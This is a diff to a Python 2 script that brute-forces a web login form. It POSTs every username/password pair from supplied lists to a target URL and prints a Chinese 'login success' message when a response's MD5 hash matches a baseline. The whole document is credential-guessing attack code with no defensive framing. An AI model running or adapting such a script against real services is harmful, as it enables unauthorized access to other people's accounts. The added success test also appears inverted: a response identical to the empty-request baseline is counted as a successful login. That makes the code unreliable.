@@ -2,6 +2,7 @@
 import requests
 import argparse
 import sys
+import hashlib
 
 def Argparse():
     parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,
@@ -58,17 +59,24 @@ elif ARGS['passfile']:
 
 datalist = []
 
+m1 = hashlib.md5()
+m1.update(requests.post(ARGS["ip"]).content)
+sres = m1.hexdigest()
+
 for u in userlist:
-	for p in passlist:
-		datalist.append({"username": u, "password": p})
+    for p in passlist:
+        datalist.append({"username": u, "password": p})
 
 for x in datalist:
-	data = x
-	res = requests.post(ARGS["ip"], data = data)
-	if ARGS["noword"] in res.text:
-		pass
-	else:
-		print "登陆成功%s%s"%(x["username"], x["password"]])
+    data = x
+    res = requests.post(ARGS["ip"], data = data)
+    m2 = hashlib.md5()
+    m2.update(res.content)
+    if m2.hexdigest() != sres :
+        print u"登陆失败 %s %s"%(x["username"], x["password"])
+    else:
+        print u"登陆成功 %s %s"%(x["username"], x["password"])
+        sys.exit()
 
 
 
